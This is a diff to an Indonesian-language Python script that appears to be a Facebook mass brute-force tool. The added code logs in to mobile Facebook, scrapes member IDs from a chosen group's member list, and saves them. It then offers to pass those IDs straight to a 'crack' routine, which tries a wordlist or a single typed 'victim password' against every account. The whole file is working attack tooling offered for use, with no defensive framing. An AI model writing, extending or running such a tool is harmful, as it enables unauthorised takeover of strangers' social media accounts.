@@ -121,6 +121,51 @@ def saring_id_teman(r):
 		id_bteman.append(i)
 		tampil('\rc==>\rb%s\rm'%i)
 
+def saring_id_group1(d):
+	for i in re.findall(r'<h3><a href="/(.*?)fref=pb',d):
+		if i.find('profile.php') == -1:
+			a = i.replace('?','')
+		else:
+			a = i.replace('profile.php?id=','').replace('&amp;','')
+		if a not in id_bgroup:
+			tampil('\rk==>\rc%s'%a)
+			id_bgroup.append(a)
+def saring_id_group0():
+	global id_group
+	while 1:
+		id_group = inputD('[?]Id Group')
+		tampil('\rh[*]Mengecek Group....')
+		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
+		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
+		try:
+			next = br.find_link(url_regex= '/browse/group/members/').url
+			break
+		except:
+			tampil('\rm[!]Id yang anda masukan salah')
+			continue
+	tampil('\rh[*]Mengambil Id dari group \rc%s'%nama)
+	saring_id_group1(a)
+	return next
+def idgroup():
+	if log != 1:
+		tampil('\rh[*]Login dulu bos...')
+		login()
+		if log == 0:
+			keluar()
+	next = saring_id_group0()
+	while 1:
+		saring_id_group1(buka(next))
+		try:
+			next = br.find_link(url_regex= '/browse/group/members/').url
+		except:
+			tampil('\rm[!]Hanya Bisa Mengambil \rh %d id'%len(id_bgroup))
+			break
+	simpan()
+	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
+	if i.upper() == 'Y':
+		return crack(id_bgroup)
+	else:
+		return menu()
 def idteman():
 	if log != 1:
 		tampil('\rc 0=====[ LOGIN ]=====0')
@@ -171,6 +216,7 @@ class mt(threading.Thread):
             self.a = 2
         else:
             self.a = 0
+
 def crack(d):
 	i = inputD('\rm Pake Wordlist or Manual {p/m} ?',['P','M'])
 	if i.upper() == 'P':
@@ -194,6 +240,7 @@ def crack(d):
 			return menu()
 	else:
 		return crack0(d,inputD(' ?>Sandi Korban'),1)
+
 def crack0(data,sandi,p):
 	tampil('\rh %MengCrack... \rk%d Akun \rhdengan sandi \rm[\rk%s\rm]'%(len(data),sandi))
 	print('\033[32;1m %Cracking... \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
@@ -249,6 +296,7 @@ def crack0(data,sandi,p):
 			return menu()
 	else:
 		return 0
+
 def lanjutT():
 	global fid_bteman
 	if len(fid_bteman) != 0:
@@ -260,13 +308,23 @@ def lanjutT():
 			fid_bteman = []
 	return 0
 
+
+def lanjutG():
+	global fid_bgroup
+	if len(fid_bgroup) != 0:
+		i = inputD('[?]Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
+		if i.upper() == 'L':
+			return crack(fid_bgroup)
+		else:
+			os.remove(os.sys.path[0]+'/MBFbgroup.txt')
+			fid_bgroup = []
+	return 0
 def menu():
 	tampil('''
 \rc
 .___         .        .  
 [__  _. _. _ |_  _  _ ;_/
 |   (_](_.(/,[_)(_)(_)| \
-
      \rk================== Welcome ===================
      \rm[ \rc+ \rm] \rh Coded : Tn.Herp                          
      \rm[ \rc+ \rm] \rh Id Fb : Gwimusa3                          
@@ -281,6 +339,5 @@ def menu():
 		idteman()
 	elif i == 2:
 		keluar()
-	
 bacaData()
 menu()
